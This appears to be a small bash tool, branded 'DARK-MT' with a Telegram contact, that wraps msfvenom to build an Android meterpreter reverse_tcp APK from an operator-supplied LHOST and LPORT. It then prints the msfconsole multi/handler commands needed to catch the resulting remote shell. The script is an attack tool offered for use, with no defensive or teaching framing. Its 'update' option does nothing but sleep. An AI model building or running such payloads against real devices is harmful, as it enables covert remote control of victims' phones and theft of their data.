#!/bin/bash

# text color
black=$'\e[0;30m'
red=$'\e[0;32m'
green=$'\e[0;32m'
yellow=$'\e[0;33m'
blue=$'\e[0;34m'
purple=$'\e[0;35m'
cyan=$'\e[0;36m'
gray=$'\e[0;90m'
light_red=$'\e[0;91m'
light_green=$'\e[0;92m'
light_yellow=$'\e[0;93m'
light_blue=$'\e[0;94m'
white=$'\e[0;35m'

# text format
reset=$'\e[0m'
bold=$'\e[1m'
faint=$'\e[2m'
italics=$'\e[3m'
underline=$'\e[4m'

# background color
bg_black=$'\e[0;40m'
bg_red=$'\e[0;41m'
bg_green=$'\e[0;42m'

alias apc="bash apc.sh"

if (( $EUID == 0 )); then
    echo "Please do not run as root"
    exit
fi

clear

figlet  D A R K - M T  | lolcat
echo -e "$reset$bold$reset"
echo -e " Payload by$blue DARK"
sleep 1
echo -e " designer: M R - D A R K "
echo -e "$reset Version:$light_yellow 1.0 $white\n"
echo -e "$reset telegram:\033[1;33m https://t.me/name_dark\n"


function create () {
    read -p 'LHOST (e.g. 127.0.0.1): ' host
    read -p 'LPORT (e.g. 4444): ' port
    read -p 'Output (e.g. payload.apk): ' output

    echo -e "\n$light_green[+]$reset Lhost: $host"
    echo -e "$light_green[+]$reset Lport: $port"
    echo -e "$light_green[+]$reset Output: $output\n"
    echo -e "$light_green[*]$reset Creating payload...\n"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $output
    echo -e "$light_green[✓]$reset Payload created.\n"
}

function listing () {
echo -e "Type:\n"
echo -e " msfconsole"
echo -e " use multi/handler"
echo -e " set payload android/meterpreter/reverse_tcp"
echo -e " set Lhost $host"
echo -e " set Lport $port"
echo -e " exploit\n"
}

function update () {
    echo -e "$light_green[*]$reset Updating repo...\n"
    sleep 3
    
    echo -e "\n$light_green[✓]$reset Repository updated.\n"
}

function close () {
    echo -e "\n$reset Time spend:$light_green $SECONDS seconds\n"
    exit
}

echo -e "$light_yellow 1)$reset Create Payload"
echo -e "$light_yellow 2)$reset Listing Target"
echo -e "$light_yellow 3)$reset Update Repo"
echo -e "$light_yellow 0)$reset Exit\n"

read -p "#? " -e -n 1 -s choice;
    case "$choice" in
            1) create;;
            2) listing;;
            3) update;;
            0) close;;
            *) echo -e "\n$red[!]$reset Not a valid choice.\n";;
    esac
